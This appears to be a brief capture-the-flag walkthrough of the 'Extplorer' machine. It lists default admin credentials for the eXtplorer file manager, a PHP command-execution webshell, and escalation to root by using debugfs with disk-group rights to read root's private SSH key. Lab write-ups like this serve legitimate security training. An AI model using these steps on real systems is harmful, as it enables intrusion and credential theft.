# Extplorer
> eXtplorer file manager + grupo disk

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

eXtplorer (web file manager) identified.

## Exploitation

Default or weak credentials on eXtplorer:

```
admin:admin
admin:extplorer
```

File manager with upload allowed → webshell uploaded.

```
# shell.php
<?php system($_GET['cmd']); ?>
```

Reverse shell as www-data.

## Privilege Escalation

User belongs to the `disk` group:

```
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data),6(disk)
```

Direct disk read as root:

```
df -h
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```

```
# save key and connect
chmod 600 id_rsa
ssh -i id_rsa root@<IP>
```

Root obtained.
